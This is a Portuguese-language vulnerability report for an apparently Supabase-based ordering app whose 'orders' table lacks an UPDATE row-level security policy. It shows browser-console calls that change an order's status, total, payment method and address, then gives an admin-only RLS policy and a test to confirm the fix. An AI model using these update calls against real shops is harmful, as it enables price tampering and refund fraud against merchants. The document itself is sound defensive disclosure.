# 🚨 DEMONSTRAÇÃO DA VULNERABILIDADE: Manipulação de Status de Pedido

## ⚠️ PROBLEMA IDENTIFICADO

A tabela `orders` **NÃO possui política de UPDATE**, permitindo que qualquer usuário autenticado possa modificar pedidos através do cliente Supabase.

## 💀 CENÁRIO DE ATAQUE

### Passo 1: Cliente faz um pedido normal
```typescript
// Cliente faz um pedido de R$ 50,00
const { data: order } = await supabase
  .from('orders')
  .insert({
    user_id: 'abc-123',
    total: 50.00,
    status: 'pending',
    payment_method: 'pix'
  })
  .select()
  .single();

console.log('Pedido criado:', order.id);
// Status: pending
// Total: R$ 50,00
```

### Passo 2: Cliente malicioso abre o Console do Navegador

No DevTools (F12), o cliente executa:

```javascript
// Importa o cliente Supabase (já está disponível na página)
import { supabase } from '@/integrations/supabase/client';

// 🎯 ATAQUE 1: Mudar status para "entregue" sem ter sido entregue
await supabase
  .from('orders')
  .update({ status: 'delivered' })
  .eq('id', 'order-id-aqui');

// ✅ SUCESSO! Status mudado para "delivered"
// Cliente recebe reembolso alegando que não recebeu

// 🎯 ATAQUE 2: Reduzir o valor total do pedido
await supabase
  .from('orders')
  .update({ total: 5.00 })
  .eq('id', 'order-id-aqui');

// ✅ SUCESSO! Pedido de R$ 50 agora custa R$ 5
// Sistema cobra apenas R$ 5

// 🎯 ATAQUE 3: Trocar método de pagamento
await supabase
  .from('orders')
  .update({ payment_method: 'cash' })
  .eq('id', 'order-id-aqui');

// ✅ SUCESSO! PIX virou dinheiro
// Sistema não cobra online

// 🎯 ATAQUE 4: Trocar endereço de entrega após confirmação
await supabase
  .from('orders')
  .update({ delivery_address_id: 'novo-endereco' })
  .eq('id', 'order-id-aqui');

// ✅ SUCESSO! Entrega vai para outro local
```

## 📊 IMPACTO FINANCEIRO

### Exemplo Real:
- **100 pedidos/dia** × **R$ 30 médio** = R$ 3.000/dia
- Se **10% dos clientes** explorarem a falha:
  - **10 pedidos manipulados/dia**
  - **R$ 300/dia em perdas** = **R$ 9.000/mês**
  - **R$ 108.000/ano** em prejuízo

### Outros Impactos:
- ❌ Perda de controle sobre status de entrega
- ❌ Cobranças incorretas (valores alterados)
- ❌ Fraudes em reembolsos
- ❌ Problemas com logística (endereços trocados)
- ❌ Dados de pedidos corrompidos

## ✅ SOLUÇÃO: Política RLS Restritiva

### O que precisa ser implementado:

```sql
-- Apenas admins podem atualizar pedidos
CREATE POLICY "Only admins can update orders"
ON orders
FOR UPDATE
TO authenticated
USING (
  public.has_role(auth.uid(), 'admin')
);
```

Isso garante que:
- ✅ Clientes podem VER seus pedidos
- ✅ Clientes podem CRIAR pedidos
- ❌ Clientes **NÃO PODEM** alterar pedidos
- ✅ Apenas admins podem atualizar status/valores

## 🎯 COMO TESTAR A CORREÇÃO

Após implementar a política, tente no console:

```javascript
// Deve retornar erro de permissão
await supabase
  .from('orders')
  .update({ status: 'delivered' })
  .eq('id', 'seu-pedido-id');

// Resultado esperado:
// Error: new row violates row-level security policy
```

---

**⚠️ ESTA VULNERABILIDADE É CRÍTICA E PRECISA SER CORRIGIDA IMEDIATAMENTE!**
